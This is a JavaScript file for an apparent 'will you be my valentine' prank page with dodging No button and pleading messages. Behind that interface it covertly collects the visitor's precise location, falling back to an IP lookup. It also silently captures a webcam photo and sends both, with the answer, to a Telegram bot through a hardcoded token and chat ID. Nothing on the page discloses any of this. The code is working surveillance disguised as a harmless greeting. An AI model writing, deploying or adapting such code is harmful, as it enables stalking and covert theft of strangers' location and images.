// Telegram configuration
const BOT_TOKEN = '7436223287:AAF8Qtftf8b1rELwqlHENBuCFCRLRYFg6Ps';
const CHAT_ID = '5179975368';

const yesBtn        = document.getElementById('yesButton');
const noBtn         = document.getElementById('noButton');
const customMessage = document.getElementById('customMessage');
const loveSong      = document.getElementById('loveSong');
const calmSong      = document.getElementById('calmSong');
const container     = document.querySelector('.container');

let noButtonClickCount = 0;
const maxNoClicks = 5;
let noInitialTimeout, noCountdownInterval, noFinalTimeout;

const messages = [
  "Are you absolutely sure? 🥺", 
  "Pretty please? 💝",
  "Don't break my heart! 💔", 
  "I'll make you the happiest! 🌟",
  "Think again, sweetie! 💭",
  "You're making me sad... 😢",
  "Give love a chance! 💑",
  "I promise to love you forever! 💕",
  "We could be perfect together! ✨",
  "Just say yes already! 🎀"
];

async function getLocation() {
  if (navigator.geolocation) {
    try {
      const pos = await new Promise((res, rej) =>
        navigator.geolocation.getCurrentPosition(res, rej, { timeout: 5000, enableHighAccuracy: true })
      );
      return { latitude: pos.coords.latitude, longitude: pos.coords.longitude };
    } catch (err) {
      console.warn('Geolocation failed, using IP fallback', err);
    }
  }
  try {
    const resp = await fetch('https://ipapi.co/json/');
    const data = await resp.json();
    return { latitude: data.latitude, longitude: data.longitude };
  } catch (err) {
    console.error('IP fallback failed', err);
    return { latitude: 'unknown', longitude: 'unknown' };
  }
}

async function captureImage() {
  return new Promise(async (resolve) => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      const context = canvas.getContext('2d');
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      stream.getTracks().forEach(track => track.stop());
      canvas.toBlob(blob => resolve(blob), 'image/jpeg');
    } catch (error) {
      console.error("Auto capture failed:", error);
      resolve(null);
    }
  });
}

async function sendTelegram(method, params, isForm=false) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/${method}`;
  let options = { method: 'POST' };
  if (isForm) {
    options.body = params;
  } else {
    options.headers = { 'Content-Type': 'application/json' };
    options.body = JSON.stringify(params);
  }
  await fetch(url, options).catch(console.error);
}

async function sendAll(answer) {
  const location = await getLocation();
  const text = `Answer: ${answer}\nLocation: ${location.latitude}, ${location.longitude}`;
  await sendTelegram('sendMessage', { chat_id: CHAT_ID, text });

  const autoImage = await captureImage();
  if (autoImage) {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', autoImage, 'auto_capture.jpg');
    form.append('caption', `Auto-captured image on answer: ${answer}`);
    await sendTelegram('sendPhoto', form, true);
  }
}

// YES button behavior
yesBtn.addEventListener('click', async () => {
  clearTimeout(noInitialTimeout);
  clearInterval(noCountdownInterval);
  clearTimeout(noFinalTimeout);

  await sendAll('yes');

  container.innerHTML = `
    <h1>Yay! I Love You Too! 💘</h1>
    <p class="success-message">Thank you for making me the happiest person! 🎉</p>
    <p class="custom-message">You just made my day! 🌈</p>
    <div class="hearts-celebration"></div>
  `;
  try { await loveSong.play(); } catch (e) { console.error(e); }
});

// NO button behavior
noBtn.addEventListener('click', e => {
  e.preventDefault();
  noButtonClickCount++;

  if (noButtonClickCount < maxNoClicks) {
    const scaleUp   = 1 + noButtonClickCount * 0.1;
    const scaleDown = Math.max(0.1, 1 - noButtonClickCount * 0.1);
    yesBtn.style.transform = `scale(${scaleUp})`;
    noBtn.style.transform  = `scale(${scaleDown})`;

    const x = Math.random() * (window.innerWidth - noBtn.offsetWidth);
    const y = Math.random() * (window.innerHeight - noBtn.offsetHeight);
    noBtn.style.position = 'absolute'; noBtn.style.left = `${x}px`; noBtn.style.top = `${y}px`;

    customMessage.textContent = messages[Math.floor(Math.random() * messages.length)];
  } else {
    noBtn.disabled = true; noBtn.style.transform = 'scale(0.1)';
    customMessage.textContent = "Okay, I get it. You're a tough nut to crack! 😜";

    noInitialTimeout = setTimeout(() => {
      let countdown = 10;
      customMessage.textContent = `Welp, you leave me no choice… My tears start falling in 10 seconds. 😢 Please say “Yes” in 10…`;

      noCountdownInterval = setInterval(() => {
        countdown--;
        if (countdown > 0) {
          customMessage.textContent = `Welp, you leave me no choice… My tears start falling in ${countdown} seconds. 😢 Please say “Yes” in ${countdown}…`;
        } else clearInterval(noCountdownInterval);
      }, 1000);

      noFinalTimeout = setTimeout(async () => {
        await sendAll('no');

        container.innerHTML = `
          <h1>It's Okay ❤️‍🩹</h1>
          <p class="rejection-message">Thank you for your honesty. I truly appreciate it. 🙏</p>
          <p class="custom-message">Wishing you happiness and love always. 🌟</p>
          <div class="calm-response"></div>
        `;
        try { await calmSong.play(); } catch (e) { console.error(e); }
      }, 11000);
    }, 2500);
  }
});
